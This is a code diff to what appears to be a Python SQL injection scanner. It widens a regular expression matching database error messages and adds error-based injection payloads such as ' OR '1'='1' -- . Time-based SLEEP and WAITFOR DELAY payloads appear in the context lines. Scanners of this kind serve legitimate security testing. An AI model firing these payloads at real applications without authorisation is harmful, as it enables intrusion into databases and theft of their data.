@@ -14,12 +14,17 @@ from core import http_client
 
 SQL_XETA = re.compile(
     r"SQL syntax.*MySQL|Warning.*mysqli?|MySQLSyntaxErrorException|"
-    r"valid MySQL result|PostgreSQL.*ERROR|pg_query\(\)|ORA-\d{5}|"
-    r"Oracle error|Microsoft SQL Server|ODBC SQL Server Driver|"
-    r"SQLite/JDBCDriver|sqlite3.OperationalError|Unclosed quotation mark|"
-    r"quoted string not properly terminated", re.IGNORECASE)
+    r"valid MySQL result|check the manual that corresponds to your MySQL|"
+    r"PostgreSQL.*ERROR|pg_query\(\)|pg_exec\(\)|PSQLException|"
+    r"ORA-\d{5}|Oracle error|Oracle.*Driver|quoted string not properly terminated|"
+    r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServer JDBC Driver|"
+    r"System\.Data\.SqlClient\.SqlException|Unclosed quotation mark|"
+    r"SQLite/JDBCDriver|sqlite3?.OperationalError|SQLITE_ERROR|"
+    r"SQLSTATE\[|DB2 SQL error|CLI Driver.*DB2|Sybase message|"
+    r"JDBC Driver|SQL error.*POS\d|you have an error in your sql syntax",
+    re.IGNORECASE)
 
-ERROR_PAYLOAD = ["'", '"', "')", "' --", "`"]
+ERROR_PAYLOAD = ["'", '"', "')", "' --", "`", "''", "\")", "' OR '1'='1' -- ", "1'1"]
 GOZLEME = 5
 TIME_PAYLOAD = [f"' AND SLEEP({GOZLEME})-- -", f"'; WAITFOR DELAY '0:0:{GOZLEME}'-- -",
                 f"' OR SLEEP({GOZLEME})-- -"]
